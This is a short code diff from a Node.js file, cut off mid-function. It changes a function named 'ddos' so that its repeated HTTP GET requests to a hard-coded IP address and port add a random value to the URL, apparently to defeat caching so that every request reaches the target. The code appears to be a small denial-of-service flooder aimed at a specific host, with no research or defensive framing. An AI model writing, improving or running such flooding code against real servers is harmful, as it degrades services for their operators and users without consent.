@@ -14,8 +14,8 @@ res.end()
 setTimeout(ddos,1000)
 function ddos(){
     const extra=Math.random()
-    // const uril='http://13.233.2.27:5000/'+extra
-    const uril='http://13.233.2.27:5000/'
+    const uril='http://13.233.2.27:5000/'+extra
+    // const uril='http://13.233.2.27:5000/'
     http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
         let pythonData = '';
       
